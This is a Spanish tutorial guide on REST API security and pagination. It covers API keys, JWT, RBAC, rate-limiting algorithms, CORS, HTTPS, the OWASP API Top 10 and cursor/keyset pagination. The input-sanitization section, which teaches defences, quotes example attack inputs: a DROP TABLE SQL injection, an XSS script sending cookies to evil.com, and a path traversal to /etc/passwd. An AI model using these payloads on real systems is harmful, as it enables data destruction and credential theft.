# Guía 04 — Seguridad y Paginación

> Autenticación, autorización, rate limiting, CORS, HTTPS, input sanitization, OWASP Top 10 para APIs y estrategias de paginación avanzada.

## Objetivos

- [ ] Diferenciar autenticación (API keys, Basic, Bearer, JWT) y autorización por roles
- [ ] Implementar rate limiting (token bucket, fixed window, sliding window)
- [ ] Configurar CORS correctamente en una API REST
- [ ] Exigir HTTPS y entender su papel
- [ ] Sanitizar entradas contra SQL injection y XSS
- [ ] Conocer el OWASP Top 10 para APIs
- [ ] Elegir la estrategia de paginación correcta (offset, cursor, keyset)
- [ ] Implementar filtering avanzado, sorting y field selection

## Autenticación en APIs REST

La **autenticación** responde "¿quién eres?". Como REST es stateless, no hay sesión de servidor: cada petición lleva una **prueba de identidad**.

### 1. API Keys

El cliente envía una clave:
```
GET /products
X-API-Key: sk_live_abc123def456
```
o como query param (menos seguro, se loguea):
```
GET /products?api_key=sk_live_abc123def456
```

- Ventaja: muy simple, ideal para server-to-server.
- Inconveniente: si la clave se roba, cualquier la usa; no identifica a un usuario, solo a una app; rotación manual.
- Buena práctica: enviar por **cabecera** (no query), **rotar** periódicamente, **scopes** por clave, **IP allowlist**.

### 2. HTTP Basic Auth

```
GET /products
Authorization: Basic dXNlcjpwYXNz   →  base64("user:pass")
```

- Ventaja: soportado por todos los clientes.
- Inconveniente: manda credenciales en cada petición (solo sobre HTTPS); no hay logout real; débil.
- Usar solo en internal APIs o con 2FA/mTLS encima. **Nunca sin HTTPS.**

### 3. Bearer Token

```
GET /products
Authorization: Bearer eyJhbGciOi...
```

El cliente obtiene un token (login OAuth2/OIDC) y lo envía en cada petición. El token puede ser opaco (un random string que el servidor consulta en BD/Redis) o un **JWT** (autocontenido).

### 4. JWT (JSON Web Token)

Un JWT tiene 3 partes: `header.payload.signature`, separadas por `.`.

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDAwMDAwMDB9.signature
```

Decodificado el payload:
```json
{ "sub": "123", "role": "admin", "exp": 1700000000 }
```

- Ventaja: **stateless** — el servidor verifica la firma sin consulta a BD.
- Inconveniente: no se puede revocar fácilmente hasta que expira; si se roba, válido hasta `exp`.
- Buenas prácticas: **expiración corta** (15 min access token + refresh token largo), algoritmo `RS256`/`ES256` (asimétrico), almacenar el secreto seguro, **no** meter datos sensibles en el payload (es solo base64, no cifrado).

Flujo típico:
```
POST /auth/login { user, pass }
→ 200 { accessToken: "<JWT>", refreshToken: "<random>" }

GET /products
Authorization: Bearer <accessToken>

POST /auth/refresh { refreshToken }
→ 200 { accessToken: "<nuevo JWT>" }
```

Sin auth o token inválido → 401. Con auth pero sin permiso → 403.

## Autorización por roles

La **autorización** responde "¿puedes hacerlo?". Tras autenticar, se comprueba si el sujeto tiene permiso sobre el recurso y la acción.

Modelos comunes:
- **RBAC** (Role-Based Access Control): roles (`admin`, `editor`, `viewer`) con permisos asociados.
- **ABAC** (Attribute-Based): reglas sobre atributos del usuario/recurso/contexto.
- **Owner-based**: solo el dueño del recurso puede tocarlo (`userId` del recurso == `userId` del token).

Tabla RBAC ejemplo:

| Recurso | admin | editor | viewer |
|---|---|---|---|
| `GET /products` | ✅ | ✅ | ✅ |
| `POST /products` | ✅ | ✅ | ❌ → 403 |
| `DELETE /products/{id}` | ✅ | ❌ → 403 | ❌ → 403 |

Ejemplo owner-based: un usuario solo puede ver/editar **sus** pedidos:
```
GET /orders/456   →  si order.userId != token.userId → 404 (no 403, para no revelar existencia)
```

Errores:
- 401 Unauthorized → **no autenticado**.
- 403 Forbidden → autenticado pero **sin permiso**.

Regla: para recursos ajenos, devuelve **404** (no 403) para no filtrar que el recurso existe.

## Rate limiting

Limitar cuántas peticiones puede hacer un cliente en una ventana de tiempo. Protege del abuso, DoS y mantiene la equidad.

Respuesta cuando se supera:
```http
HTTP/1.1 429 Too Many Requests
Retry-After: 60
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1700000060

{ "error": "rate_limit_exceeded", "message": "Demasiadas peticiones, reintenta en 60s" }
```

Cabeceras recomendadas:
- `X-RateLimit-Limit`: máximo permitido en la ventana.
- `X-RateLimit-Remaining`: cuántas quedan.
- `X-RateLimit-Reset`: timestamp epoch en el que se resetea.
- `Retry-After`: segundos a esperar.

### Algoritmos de rate limiting

#### 1. Fixed Window (ventana fija)

Cuenta peticiones en ventanas de tiempo fijas (ej. cada minuto): `count` en `[00:00, 01:00)`, `[01:00, 02:00)`, etc.

- Ventaja: muy simple, un contador en Redis `INCR` con `EXPIRE`.
- Inconveniente: **ráfagas en los bordes** — un cliente puede hacer 100 peticiones a las 00:59 y otras 100 a las 01:01, 200 en 2 segundos.

#### 2. Sliding Window (ventana deslizante)

Ventana continua de los últimos N segundos. Se aproxima con dos contadores: ventana actual + peso de la ventana anterior.

```
count = current_window_count + prev_window_count * (1 - elapsed/window_size)
```

- Ventaja: más justo, sin ráfagas en bordes.
- Inconveniente: más memoria y cómputo.

#### 3. Token Bucket (cubo de tokens)

El cliente tiene un cubo de capacidad `C` que se rellena a `R` tokens/segundo. Cada petición consume 1 token. Si no hay tokens → 429.

- Ventaja: permite **ráfagas controladas** (hasta `C` de golpe) y sostenido a `R`.
- Inconveniente: estado por cliente.

#### 4. Leaky Bucket

Como token bucket pero las peticiones se procesan a tasa constante (cola FIFO). Suaviza el tráfico.

| Algoritmo | Ráfagas | Complejidad | Estado |
|---|---|---|---|
| Fixed window | Sí, en bordes | Baja | 1 contador |
| Sliding window | No | Media | 2 contadores |
| Token bucket | Sí (hasta capacidad) | Media | nivel + tiempo |
| Leaky bucket | No | Media | cola |

**Identidad del limit**: por IP, por API key, por usuario. Para APIs autenticadas, por `userId` (más justo que por IP, que puede compartirse tras NAT).

## Quota

La **quota** es un límite **agregado** (no por ventana), típicamente por día/mes: "1000 peticiones/día", "10000/mes". Se descuenta y se resetea al ciclo de facturación.

Diferencia con rate limit: rate limit protege el sistema (corto plazo); quota controla el uso comercial (largo plazo).

Respuesta al superar quota:
```http
HTTP/1.1 429 Too Many Requests
X-Quota-Limit: 10000
X-Quota-Remaining: 0
X-Quota-Reset: 2024-02-01T00:00:00Z
```

## CORS en APIs REST

**CORS** (Cross-Origin Resource Sharing) controla si un **navegador** puede llamar a tu API desde un origen distinto (`scheme://host:port`).

Sin CORS, el navegador bloquea por defecto peticiones cross-origin. El servidor responde con cabeceras que autorizan:

```
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600
```

**Preflight**: para peticiones "no simples" (con `Authorization`, `Content-Type: application/json`, métodos distintos de GET/POST/HEAD), el navegador envía primero un `OPTIONS` y el servidor responde con los permisos.

```
OPTIONS /products
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```
```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 600
```

Reglas:
- `Access-Control-Allow-Origin: *` no se puede combinar con `Allow-Credentials: true`. Si permites credenciales, indica el origen concreto.
- No uses `*` en producción para APIs con auth.
- CORS **protege al navegador**, no al servidor. Una API pública puede ser llamada desde cualquier cliente no-navegador sin CORS.

## HTTPS obligatorio

REST transmite tokens, datos de usuario y de negocio. **Sin HTTPS** todo va en claro y es interceptable (man-in-the-middle, sniffing).

- Usa TLS 1.2+ (ideal 1.3).
- Redirige HTTP → HTTPS (301 o HSTS).
- Cabecera `Strict-Transport-Security: max-age=31536000; includeSubDomains` (HSTS).
- Certificados válidos (Let's Encrypt gratis).
- Desactiva HTTP plain en producción o solo para redirigir.

Sin HTTPS, Basic Auth, Bearer y API keys son **trivialmente** robables. No es opcional.

## Input sanitization

### SQL Injection

El cliente inyecta SQL en un campo:
```
GET /users?name=Ana'; DROP TABLE users;--
```

Si el servidor concatena: `SELECT * FROM users WHERE name = 'Ana'; DROP TABLE users;--'` → catástrofe.

Defensa:
- **Queries parametrizadas / prepared statements** SIEMPRE. Nunca concatenes SQL.
- ORMs por defecto parametrizan.
- Listas blancas para nombres de columnas (en `sort`).

Ejemplo seguro (parametrizado):
```python
cursor.execute("SELECT * FROM users WHERE name = %s", (name,))
```

### XSS (Cross-Site Scripting)

El cliente inyecta HTML/JS que se renderiza en el navegador de otro usuario:
```json
{ "name": "<script>fetch('https://evil.com?c='+document.cookie)</script>" }
```

Defensa:
- **Escapar** al renderizar en el frontend (frameworks modernos lo hacen por defecto).
- **Content-Type: application/json** (no `text/html`) para que el navegador no interprete.
- `Content-Security-Policy` en el frontend.
- Si la API almacena HTML, sanitízalo al recibir (librerías como DOMPurify).

### Otros

- **Path traversal**: `GET /files/../../etc/passwd`. Valida y normaliza paths.
- **SSRF**: el servidor hace peticiones a una URL del usuario; valida que no sea interna.
- **Command injection**: si usas `exec` con input del usuario, escapa o usa APIs sin shell.
- **Deserialization**: no deserialices objetos arbitrarios de input no confiable.
- **Mass assignment**: el cliente envía campos que no debería poder setear (`{"role":"admin"}` en un POST `/users`). Usa allowlists de campos.

## OWASP Top 10 para APIs

El **OWASP API Security Top 10** lista los riesgos más comunes en APIs:

| # | Riesgo | Resumen |
|---|---|---|
| API1 | Broken Object Level Authorization (BOLA) | Acceder/modificar recursos ajenos cambiando el id |
| API2 | Broken Authentication | Auth débil, tokens predecibles, gestión de sesiones |
| API3 | Broken Object Property Level Authorization | Exponer/escribir campos de más (mass assignment) |
| API4 | Unrestricted Resource Consumption | Sin rate limiting, sin quota, payloads gigantes |
| API5 | Broken Function Level Authorization | Roles mal chequeados, endpoints admin sin proteger |
| API6 | Unrestricted Access to Sensitive Business Flows | Abuso de flujos (comprar, reservar) sin límites |
| API7 | SSRF | El servidor llama a URLs del cliente |
| API8 | Security Misconfiguration | Cabeceras, CORS abierto, errores verbosos, puertos abiertos |
| API9 | Vulnerable Components | Librerías con CVEs sin actualizar |
| API10 | Unsafe Consumption of APIs | Confianza ciega en APIs de terceros |

Mitigaciones clave:
- **BOLA**: comprobar en cada petición que el usuario tokenizado es dueño o tiene rol sobre **ese recurso concreto** (no solo "está autenticado").
- **Mass assignment**: allowlist de campos por endpoint.
- **Rate limit + quota** en todos los endpoints sensibles.
- **CORS estricto** y cabeceras de seguridad (`X-Content-Type-Options: nosniff`, etc.).
- **Dependencias** actualizadas y escaneadas.

## Paginación: offset vs cursor vs keyset

Recordatorio de la guía 02, con más detalle.

### Offset

```
GET /products?limit=20&offset=40
```
```sql
SELECT * FROM products LIMIT 20 OFFSET 40;
```
- Simple, permite "ir a página N".
- **O(N)**: la BD descarta los primeros 40.
- **Saltos**: si insertan entre petición y petición, aparecen duplicados/omitidos.

### Cursor

```
GET /products?limit=20&cursor=eyJpZCI6NDF9
```
```sql
SELECT * FROM products WHERE id > 41 ORDER BY id LIMIT 20;
```
- **O(1)**: usa el índice de `id`.
- Estable ante inserciones.
- No permite saltar a página arbitraria.

### Keyset

Como cursor pero por cualquier columna ordenada:
```
GET /products?limit=20&sort=price&last_price=99.90&last_id=prod_041
```
```sql
SELECT * FROM products
WHERE (price, id) < (99.90, 'prod_041')
ORDER BY price DESC, id DESC LIMIT 20;
```
- Estable, rápido, soporta orden arbitrario.
- El cursor codifica los valores de los campos de orden.

| Estrategia | Velocidad | Salto a página | Estable ante inserciones | Complejidad |
|---|---|---|---|---|
| Offset | O(N) | ✅ | ❌ | Baja |
| Cursor | O(1) | ❌ | ✅ | Media |
| Keyset | O(1) | ❌ | ✅ | Alta |

## Filtering avanzado, sorting, field selection

### Filtering avanzado

Operadores con sintaxis tipo JSON:API:
```
GET /products?filter[price][gte]=10&filter[price][lte]=100
GET /products?filter[category]=electronics&filter[stock][gt]=0
```

o más simple:
```
GET /products?price_min=10&price_max=100&in_stock=true
```

Operadores típicos: `eq` (defecto), `neq`, `gt`, `gte`, `lt`, `lte`, `in`, `nin`, `like`, `exists`, `null`.

Para filtros complejos (OR/AND anidados), mejor `POST /products/search` con body JSON:
```json
{ "query": { "or": [ { "price": { "lt": 10 } }, { "category": "sale" } ] } }
```

**Validación**: solo permite campos y operadores de una lista blanca para evitar inyección en el `WHERE`.

### Sorting

```
GET /products?sort=-price,name
```
- `-` prefijo = descendente.
- Varios campos separados por coma.
- Validar campos permitidos contra lista blanca.

### Field selection

Permite al cliente pedir solo los campos que necesita (GraphQL-style):
```
GET /products/prod_001?fields=name,price
```
```json
{ "id": "prod_001", "name": "Teclado", "price": 89.90 }
```

- Reduce payload, mejora rendimiento en móviles.
- Implementación: parsear `fields`, proyectar en la consulta/serialización.
- `fields=*` para todos.
- En colecciones: `?fields=name,price(category{name})` (sintaxis JSON:API).

| Query param | Para qué |
|---|---|
| `limit`, `offset`/`cursor` | Paginación |
| `sort` | Orden |
| `filter` o campos directos | Filtrado |
| `fields` | Proyección (field selection) |
| `expand`/`include` | Embebido de relaciones |

## Conceptos clave

- **Auth vs AuthN/AuthZ**: quién eres (API key, Basic, Bearer, JWT) vs qué puedes (RBAC, ABAC, owner-based).
- **JWT**: stateless, 3 partes; corta expiración + refresh.
- **Rate limiting**: token bucket (ráfagas), sliding window (justo), fixed window (simple, bordes).
- **Quota**: límite agregado comercial.
- **CORS**: protege al navegador, no al servidor; preflight con OPTIONS.
- **HTTPS**: obligatorio; sin él, toda auth es robable.
- **SQL injection/XSS**: parametrizar, escapar, allowlists.
- **OWASP API Top 10**: BOLA, mass assignment, rate limit ausente son los más comunes.
- **Paginación**: offset O(N) con saltos; cursor/keyset O(1) estables.
- **field selection**: `?fields=` reduce payload.

## Errores comunes

- **Confundir 401 y 403** (no autenticado vs sin permiso).
- **Almacenar JWT en localStorage** expuesto a XSS; preferir httpOnly cookies.
- **JWT con expiración larga** y sin revocación: robo = desastre.
- **Rate limit solo por IP** tras un NAT: un usuario abusa, todos pagan.
- **No devolver `Retry-After`** en 429: el cliente reintenta loco.
- **CORS `*` con credenciales**: configuración inválida y peligrosa.
- **Concatenar SQL** con filtros del query: inyección directa.
- **Olvidar BOLA**: solo chequeas "está logueado", no "es dueño de este recurso".
- **Mass assignment**: aceptas `{"role":"admin"}` en un PUT de perfil.
- **Offset en tablas de millones** de filas: peticiones cada vez más lentas.
- **No validar `sort`** contra lista blanca: inyección en `ORDER BY`.
